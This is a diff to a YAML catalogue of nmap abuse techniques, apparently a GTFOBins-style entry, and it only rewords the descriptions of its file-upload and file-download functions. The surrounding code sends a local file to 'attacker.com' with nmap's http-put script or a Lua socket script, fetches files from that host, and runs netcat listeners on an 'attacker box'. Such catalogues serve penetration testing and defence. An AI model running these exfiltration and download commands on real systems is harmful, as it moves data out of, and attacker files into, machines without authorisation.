@@ -39,13 +39,13 @@ functions:
         end;c:close();f:close();' > $TF
         nmap --script=$TF
   file-upload:
-    - description: Send a file to a TCP port. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
+    - description: Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
       code: |
         RHOST=attacker.com
         RPORT=8080
         LFILE=file_to_send
         nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
-    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
@@ -61,14 +61,14 @@ functions:
         t:close();' > $TF
         nmap --script=$TF
   file-download:
-    - description: Fetch remote file sent to a local TCP port. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
+    - description: Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
       code: |
         RHOST=attacker.com
         RPORT=8080
         TF=$(mktemp -d)
         LFILE=file_to_save
         nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
-    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
+    - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
       code: |
         export LPORT=12345
         export LFILE=file_to_save
